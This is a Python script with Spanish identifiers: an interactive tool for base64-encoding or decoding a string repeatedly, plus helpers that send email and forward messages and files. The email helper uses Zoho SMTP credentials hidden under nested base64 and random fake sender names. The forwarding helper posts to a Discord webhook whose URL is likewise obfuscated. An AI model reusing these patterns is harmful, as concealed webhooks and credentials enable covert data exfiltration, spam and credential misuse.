import base64
import smtplib
import names
import base64
import logging
import os
import time
import requests
from colorama import Fore, init
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.utils import formataddr

init(autoreset=True)

def send_email(direccion, asunto, mensaje, archivos_adjuntos=None):
    e_username = "Vm0xd1IyRnRVWGxWV0dSUFZsZG9WMWxyWkc5V2JHeDBaVVYwV0ZKdGVEQlVWbHBQWVd4S2MxWnFUbGhoTVVwRVZrZHplRll4VG5OYVJtUlhUVEpvYjFaclVrZFpWbHBYVTI1V2FGSnRhRmxWTUZaTFZGWmFjbHBFVWxwV2JIQjZWa2Q0VjFaSFNrbFJiVGxhVmtVMVJGUlhlR3RqYkd0NllVWlNUbFl4U2tsV1ZFa3hWakZXZEZOc2FHeFNhelZvVm1wT2IyRkdjRmhsUjNScVlrZFNlVll5ZUVOV01rVjNZMFpTVjFaV2NGTmFSRVpEVld4Q1ZVMUVNRDA9"
    e_password = "Vm0wd2QyUXlVWGxWV0d4WFlUSm9WMVl3Wkc5V2JHeDBaVVYwV0ZKdGVGWlZNbmhQVmpGYWMySkVUbGhoTVhCUVZteFZlRll5U2tWVWJHUnBWa1phZVZadE1UUlRNazE1Vkd0c2FsSnRhRzlVVmxaM1ZsWmtWMVp0UmxSTmJFcFlWVzAxVDJGV1NYZFhiRkpYWWxob2VsUlVSbUZrUjA1R1drWndWMDFFUlRCV01uUnZWakpHUjFOdVRtcFNiV2hoV1ZSR1lVMHhWWGhYYlVacVlraENSbFpYZUZOVWJVcEdZMFZ3VjJKSFVYZFdha1poVjBaT2NtRkdXbWhsYlhob1YxZDRiMkl4VGtkVmJGWlRZbFZhY1ZscldtRmxWbVJ5VjJzNVZXSkdjREZWVjNodlZqRktjMk5HYUZkaGEzQklWVEJhWVdSV1NuTlRiR1JUVFRBd01RPT0="
    name = str(names.get_full_name())
    msg = MIMEMultipart()
    msg['Subject'] = asunto
    msg['From'] = formataddr((name, descodear(e_username, 8)))
    msg['To'] = direccion

    msg.attach(MIMEText(mensaje, 'plain', 'utf-8'))

    if archivos_adjuntos:
        for archivo_adjunto in archivos_adjuntos:
            with open(archivo_adjunto, 'rb') as f:
                attached_file = MIMEApplication(f.read())
                attached_file.add_header('content-disposition', 'attachment', filename=archivo_adjunto)
                msg.attach(attached_file)


    try:
        server = smtplib.SMTP("smtp.zoho.eu", 587)
        server.starttls()
        server.login(descodear(e_username, 8), descodear(e_password, 12))
        server.sendmail(descodear(e_username, 8), direccion, msg.as_string())
        server.quit()
        print(f'{Fore.GREEN}Correo enviado correctamente a {direccion}.')
        time.sleep(30)
    except Exception as e:
        clear()
        print(f'{Fore.RED}Error: {e}. No se pudo enviar el email.')
        print("Intentelo de nuevo")
        time.sleep(5)

def send_data(correo, asunto, mensaje, archivos=None):
    url = "WVVoU01HTklUVFpNZVRscllWaE9hbUl6U210TWJVNTJZbE01YUdOSGEzWmtNbFpwWVVjNWRtRXpUWFpOVkVWNlRucE5lazlFUlRWT2Fsa3dUMVJOZWsxcVozbE9lVGxHVW14S1NtTllTazVqV0hCVVpHMW9VRTF1V1ROTmEwNTJXakpHVWxWV2F6SldSRTE0V1ZSc2JHUklVWFJWYWxKUVZESTFVbE5GU21waWFrSktVa2RqZVU5WFJrSlhWRXBMVFVVNVdWZHJPVmxVUld4RFlsZGFWbE5uUFQwPQ=="

    payload = {
        "content": f"__Nuevo mensaje!__\n**{correo}**\n## {asunto}\n```\n{mensaje}\n```"
    }

    if archivos is not None:
        archivos_adjuntos = [('file', open(archivo, 'rb')) for archivo in archivos]
        response = requests.post(descodear(url,3), files=archivos_adjuntos, data=payload)
    else:
        response = requests.post(descodear(url,3), json=payload)

    if response.status_code == 204:
        print("Mensaje y archivos enviados exitosamente a la webhook de Discord")
    else:
        print(f"Error al enviar el mensaje y archivos. Código de estado: {response.status_code}")
        print(response.text)  # Imprime la respuesta del servidor en caso de error


def codear(texto, veces):
	for a in range(veces):
		coded = base64.b64encode(texto.encode('utf-8')).decode('utf-8')
		texto = coded
	return coded

def descodear(texto, veces):
	for a in range(veces):
		decoded = base64.b64decode(texto).decode('utf-8')
		texto = decoded
	return decoded

def clear():
	os.system("cls") if os.name == "nt" else os.system("clear")

def main():
	var = str(input("Cadena: "))
	num = int(input("Numero de veces: "))
	cod = int(input("1. Encode\n2. Decode\n"))
	if cod == 1:
		print(codear(var, num))
	elif cod == 2:
		print(descodear(var, num))

if __name__ == '__main__':
	main()